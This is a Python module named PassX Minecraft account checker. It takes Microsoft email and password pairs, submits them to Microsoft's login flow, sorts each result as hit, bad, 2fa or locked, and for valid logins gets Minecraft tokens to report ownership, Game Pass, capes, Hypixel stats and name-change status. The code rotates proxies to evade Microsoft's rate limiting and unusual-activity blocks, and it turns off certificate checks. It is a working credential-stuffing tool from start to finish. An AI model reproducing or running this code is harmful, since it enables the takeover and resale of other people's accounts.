"""
PassX — Minecraft Account Checker Module
Integrated from MSMC checker. Checks Microsoft accounts for Minecraft ownership,
Game Pass, capes, Hypixel stats, ban status, and name change availability.

Usage:
    from automation.mc_checker import check_mc_account
    result = check_mc_account(email, password, use_proxy=True)
"""

import requests
import re
import time
import random
import json
import urllib3
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from typing import Optional

urllib3.disable_warnings()

# ── Xbox/MC Auth URLs ──
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 5


def _get_proxy_dict():
    """Get a proxy dict from PassX's proxy manager."""
    try:
        from automation.proxymanager import get_proxy_manager
        mgr = get_proxy_manager()
        proxy = mgr.get_next_proxy()
        if proxy:
            url = proxy.auth_string
            return {"http": url, "https": url}
    except:
        pass
    return None


def _get_session(use_proxy=True):
    """Create a requests session with optional proxy."""
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
    })
    if use_proxy:
        proxy = _get_proxy_dict()
        if proxy:
            session.proxies = proxy
    return session


def _get_urlpost_sfttag(session):
    """Get the login URL and sFTTag from Microsoft's OAuth page."""
    for _ in range(MAX_RETRIES):
        try:
            text = session.get(SFTAG_URL, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sfttag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sfttag
        except:
            pass
        # Rotate proxy on failure
        proxy = _get_proxy_dict()
        if proxy:
            session.proxies = proxy
    return None, None


def _get_xbox_token(session, email, password, url_post, sfttag):
    """Authenticate with Microsoft and get Xbox RPS token."""
    for attempt in range(MAX_RETRIES):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sfttag}
            resp = session.post(url_post, data=data,
                                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                allow_redirects=True, timeout=15)

            url_lower = resp.url.lower()
            text_lower = resp.text.lower()

            # Success: got access token in URL fragment
            if '#' in resp.url and resp.url != SFTAG_URL:
                token = parse_qs(urlparse(resp.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"

            # Recovery cancel flow (still a valid login)
            elif 'cancel?mkt=' in resp.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text).group()
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text).group()
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text).group()
                    action_url = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text).group()
                    ret = session.post(action_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
                    cancel_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                    fin = session.get(cancel_url, allow_redirects=True)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass

            # 2FA / security verification required (login IS valid, just needs 2FA)
            elif any(v in resp.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"

            # Rate limit detection
            elif any(v in text_lower for v in ["too many requests", "try with another device", "unusual activity", "temporarily blocked", "tried to sign in too many times"]):
                return None, "rate_limited"

            # Wrong password / account doesn't exist
            elif any(v in text_lower for v in ["password is incorrect", "account doesn\\'t exist", "that microsoft account doesn", "sign in to your microsoft account", "your account or password is incorrect"]):
                return None, "bad"

            # Account locked
            elif "account has been locked" in text_lower or "account is locked" in text_lower:
                return None, "locked"

            # Landed on a Microsoft page that implies successful auth but no token
            # (e.g. consent page, terms page)
            elif "oauth20_desktop.srf" in resp.url:
                # Try to extract token from URL
                token = parse_qs(urlparse(resp.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
                # Valid login but couldn't get token
                return None, "valid_no_token"

            else:
                # Unknown page — could be rate limit or transient issue
                # Print for debugging
                print(f"⚠️ MC Checker: Unknown page for {email} (attempt {attempt+1})")
                print(f"   URL: {resp.url[:100]}")
                # Check if page has any sign of rate limiting
                if "try again" in text_lower or "too many" in text_lower:
                    return None, "rate_limited"
                # Retry with proxy rotation
                proxy = _get_proxy_dict()
                if proxy:
                    session.proxies = proxy
                continue

        except Exception as e:
            print(f"⚠️ MC auth exception: {e}")
            proxy = _get_proxy_dict()
            if proxy:
                session.proxies = proxy
            continue

    # All retries exhausted — report as error, not bad
    return None, "error"


def _xbox_authenticate(session, rps_token):
    """Xbox Live authentication chain: RPS -> Xbox Token -> XSTS -> MC Token."""
    try:
        # Xbox Live auth
        xbox_resp = session.post(
            'https://user.auth.xboxlive.com/user/authenticate',
            json={
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            },
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            timeout=15
        )
        xbox_data = xbox_resp.json()
        xbox_token = xbox_data.get('Token')
        if not xbox_token:
            return None, None

        uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']

        # XSTS auth
        xsts_resp = session.post(
            'https://xsts.auth.xboxlive.com/xsts/authorize',
            json={
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            },
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            timeout=15
        )
        xsts_token = xsts_resp.json().get('Token')
        if not xsts_token:
            return None, None

        # MC token
        for _ in range(MAX_RETRIES):
            try:
                mc_resp = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                    headers={'Content-Type': 'application/json'},
                    timeout=15
                )
                if mc_resp.status_code == 429:
                    time.sleep(2)
                    continue
                mc_token = mc_resp.json().get('access_token')
                return mc_token, uhs
            except:
                continue

    except:
        pass
    return None, None


def _check_mc_ownership(session, mc_token):
    """Check what Minecraft products the account owns."""
    for _ in range(MAX_RETRIES):
        try:
            resp = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )
            if resp.status_code == 200:
                text = resp.text
                if 'product_game_pass_ultimate' in text:
                    return "Xbox Game Pass Ultimate"
                elif 'product_game_pass_pc' in text:
                    return "Xbox Game Pass"
                elif '"product_minecraft"' in text:
                    return "Java Edition"
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text:
                        others.append("Bedrock")
                    if 'product_legends' in text:
                        others.append("Legends")
                    if 'product_dungeons' in text:
                        others.append("Dungeons")
                    if others:
                        return ", ".join(others)
                    return None
            elif resp.status_code == 429:
                time.sleep(2)
                continue
            else:
                return None
        except:
            continue
    return None


def _get_mc_profile(session, mc_token):
    """Get Minecraft profile (username, UUID, capes)."""
    for _ in range(MAX_RETRIES):
        try:
            resp = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                capes = ", ".join([cape["alias"] for cape in data.get("capes", [])]) or "None"
                return {
                    "username": data.get("name", "N/A"),
                    "uuid": data.get("id", "N/A"),
                    "capes": capes,
                }
            elif resp.status_code == 429:
                time.sleep(2)
                continue
            else:
                return None
        except:
            continue
    return None


def _check_hypixel(session, username, use_proxy=True):
    """Check Hypixel stats via plancke.io."""
    try:
        proxies = _get_proxy_dict() if use_proxy else None
        resp = requests.get(
            f'https://plancke.io/hypixel/player/stats/{username}',
            proxies=proxies,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            verify=False,
            timeout=15
        )
        text = resp.text
        result = {}

        try:
            result["hypixel_info"] = re.search(r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', text).group()
        except:
            result["hypixel_info"] = None

        try:
            result["level"] = re.search(r'(?<=Level:</b> ).+?(?=<br/><b>)', text).group()
        except:
            result["level"] = None

        try:
            result["first_login"] = re.search(r'(?<=<b>First login: </b>).+?(?=<br/><b>)', text).group()
        except:
            result["first_login"] = None

        try:
            result["last_login"] = re.search(r'(?<=<b>Last login: </b>).+?(?=<br/>)', text).group()
        except:
            result["last_login"] = None

        try:
            result["bw_stars"] = re.search(r'(?<=<li><b>Level:</b> ).+?(?=</li>)', text).group()
        except:
            result["bw_stars"] = None

        return result
    except:
        return {}


def _check_namechange(session, mc_token):
    """Check name change availability."""
    try:
        resp = session.get(
            'https://api.minecraftservices.com/minecraft/profile/namechange',
            headers={'Authorization': f'Bearer {mc_token}'},
            timeout=15
        )
        if resp.status_code == 200:
            data = resp.json()
            result = {}
            result["can_change"] = str(data.get('nameChangeAllowed', 'N/A'))
            created_at = data.get('createdAt')
            if created_at:
                try:
                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                except ValueError:
                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                given_date = given_date.replace(tzinfo=timezone.utc)
                current_date = datetime.now(timezone.utc)
                difference = current_date - given_date
                days = difference.days
                result["last_changed"] = f"{days} days ago ({given_date.strftime('%m/%d/%Y')})"
            return result
    except:
        pass
    return {}


def _check_optifine(username, use_proxy=True):
    """Check if account has an Optifine cape."""
    try:
        proxies = _get_proxy_dict() if use_proxy else None
        resp = requests.get(
            f'http://s.optifine.net/capes/{username}.png',
            proxies=proxies,
            verify=False,
            timeout=10
        )
        if "Not found" in resp.text:
            return False
        else:
            return True
    except:
        return None


def check_mc_account(email: str, password: str, use_proxy: bool = True) -> dict:
    """
    Full Minecraft account check.
    
    Strategy: Always starts PROXYLESS first. If rate limited ("Too Many Requests",
    "try with another device", etc.), automatically retries with proxies.
    The use_proxy param controls whether proxy fallback is allowed.
    
    Returns dict with:
        - status: "hit", "no_mc", "2fa", "bad", "error"
        - ownership: str (Java Edition, Xbox Game Pass, etc.)
        - username: MC username
        - uuid: MC UUID
        - capes: str
        - hypixel: dict with level, first/last login, etc.
        - optifine_cape: bool
        - name_change: dict
    """
    result = {
        "status": "error",
        "email": email,
        "ownership": None,
        "username": None,
        "uuid": None,
        "capes": None,
        "hypixel": {},
        "optifine_cape": None,
        "name_change": {},
    }

    # Try proxyless first, then with proxy on rate limit
    attempts = [False]  # First attempt: no proxy
    if use_proxy:
        attempts.append(True)  # Second attempt: with proxy
        attempts.append(True)  # Third attempt: rotate proxy again

    for attempt_idx, attempt_use_proxy in enumerate(attempts):
        try:
            session = _get_session(use_proxy=attempt_use_proxy)

            if attempt_idx > 0:
                print(f"🔄 MC Check retry #{attempt_idx} with proxy for {email}")

            # Step 1: Get login form
            url_post, sfttag = _get_urlpost_sfttag(session)
            if not url_post or not sfttag:
                # Might be rate limited at login page level
                if attempt_idx < len(attempts) - 1:
                    session.close()
                    continue
                result["status"] = "error"
                result["error"] = "Could not load Microsoft login page (rate limited)"
                session.close()
                return result

            # Step 2: Microsoft auth
            rps_token, auth_status = _get_xbox_token(session, email, password, url_post, sfttag)

            if auth_status == "rate_limited":
                print(f"🚫 Rate limited on MC check for {email}, switching to proxy...")
                session.close()
                if attempt_idx < len(attempts) - 1:
                    continue
                result["status"] = "error"
                result["error"] = "Rate limited by Microsoft on all attempts"
                return result

            if auth_status == "error":
                # All retries in _get_xbox_token exhausted, try next proxy
                session.close()
                if attempt_idx < len(attempts) - 1:
                    continue
                result["status"] = "error"
                result["error"] = "Could not authenticate (unknown page)"
                return result

            if auth_status == "2fa":
                # Login IS valid but needs 2FA
                result["status"] = "2fa"
                session.close()
                return result

            if auth_status == "locked":
                result["status"] = "locked"
                result["error"] = "Account is locked"
                session.close()
                return result

            if auth_status == "bad":
                result["status"] = "bad"
                session.close()
                return result

            if auth_status == "valid_no_token":
                # Login worked but couldn't extract token — still valid
                result["status"] = "valid_no_mc"
                result["error"] = "Login valid but could not get Xbox token"
                session.close()
                return result

            if not rps_token:
                result["status"] = "bad"
                session.close()
                return result

            # Step 3: Xbox + MC token chain
            mc_token, uhs = _xbox_authenticate(session, rps_token)
            if not mc_token:
                result["status"] = "no_mc"
                result["error"] = "Xbox auth succeeded but MC token failed"
                session.close()
                return result

            # Step 4: Check MC ownership
            ownership = _check_mc_ownership(session, mc_token)
            if not ownership:
                result["status"] = "no_mc"
                session.close()
                return result

            result["status"] = "hit"
            result["ownership"] = ownership

            # Step 5: Get MC profile
            profile = _get_mc_profile(session, mc_token)
            if profile:
                result["username"] = profile["username"]
                result["uuid"] = profile["uuid"]
                result["capes"] = profile["capes"]

                # Step 6: Hypixel stats (use proxy for external APIs)
                if profile["username"] and profile["username"] != "N/A":
                    result["hypixel"] = _check_hypixel(session, profile["username"], use_proxy)

                    # Step 7: Optifine cape
                    result["optifine_cape"] = _check_optifine(profile["username"], use_proxy)

                # Step 8: Name change
                result["name_change"] = _check_namechange(session, mc_token)

            session.close()
            return result

        except Exception as e:
            try:
                session.close()
            except:
                pass
            if attempt_idx < len(attempts) - 1:
                continue
            result["status"] = "error"
            result["error"] = str(e)
            return result

    return result
